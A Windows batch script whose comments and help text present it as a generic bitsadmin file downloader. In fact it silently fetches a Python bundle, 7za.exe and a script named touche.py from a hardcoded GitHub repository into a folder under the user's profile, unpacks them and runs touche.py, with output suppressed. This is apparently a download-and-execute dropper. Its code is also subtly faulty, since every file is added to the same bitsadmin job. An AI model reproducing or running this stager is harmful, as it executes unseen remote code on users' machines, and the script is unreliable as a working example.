   @echo off
    setlocal
    
    :: uses bitsadmin utility to download a file
    :: bitsadmin is not available in winXP Home edition
    :: the only way to download a file with 'pure' batch
   :download
   
    mkdir C:\Users\%username%\_tmp_\
    cd C:\Users\%username%\_tmp_\

    set url=https://github.com/somehat/files/raw/main/python.zip
    set url1=https://github.com/somehat/files/raw/main/7za.exe
    set url2=https://github.com/somehat/files/raw/main/touche.py
    set file=python.zip
    set file1=7za.exe
    set file2=touche.py
    rem ----
    if "%~3" NEQ "" (
        set /A timeout=%~3
    ) else (
        set timeout=5
    )

    bitsadmin /cancel download >nul
    bitsadmin /create /download download >nul 
    call bitsadmin /addfile download "%url%" "%CD%\%file%" >nul
    bitsadmin /resume download >nul 
    bitsadmin /setproxysettings download AUTODETECT >nul

    bitsadmin /cancel download1 >nul
    bitsadmin /create /download download1 >nul 
    call bitsadmin /addfile download "%url1%" "%CD%\%file1%" >nul
    bitsadmin /resume download1 >nul
    bitsadmin /setproxysettings download1 AUTODETECT >nul

    bitsadmin /cancel download2 >nul
    bitsadmin /create /download download2 >nul 
    call bitsadmin /addfile download "%url2%" "%CD%\%file2%" >nul
    bitsadmin /resume download2 >nul 
    bitsadmin /setproxysettings download2 AUTODETECT >nul

    set /a attempts=0
    :repeat
    set /a attempts +=1
    if "%attempts%" EQU "10" (
        echo TIMED OUT
        endlocal
        exit /b 1
    )
    bitsadmin /info download /verbose | find  "STATE: ERROR"  >nul 2>&1 && endlocal &&  bitsadmin /cancel download && echo SOME KIND OF ERROR && exit /b 2
    bitsadmin /info download /verbose | find  "STATE: SUSPENDED" >nul 2>&1 && endlocal &&  bitsadmin /cancel download &&echo FILE WAS NOT ADDED && exit /b 3
    bitsadmin /info download /verbose | find  "STATE: TRANSIENT_ERROR" >nul 2>&1 && endlocal &&  bitsadmin /cancel download &&echo TRANSIENT ERROR && exit /b 4
    bitsadmin /info download /verbose | find  "STATE: TRANSFERRED" >nul 2>&1 && goto :finishing 

   w32tm /stripchart /computer:localhost /period:1 /dataonly /samples:%timeout%  >nul 2>&1

    goto :repeat
    :finishing 
    bitsadmin /complete download >nul
    echo download finished

    7za.exe x python.zip
    MOVE touche.py python
    cd python
    python.exe touche.py
    endlocal

   goto :eof

   :help
   echo %~n0 url file [timeout]
   echo.
   echo  url - the source for download
   echo  file - file name in local directory where the file will be stored
   echo  timeout - number in seconds between each check if download is complete (attempts are 10)
   echo.
   goto :eof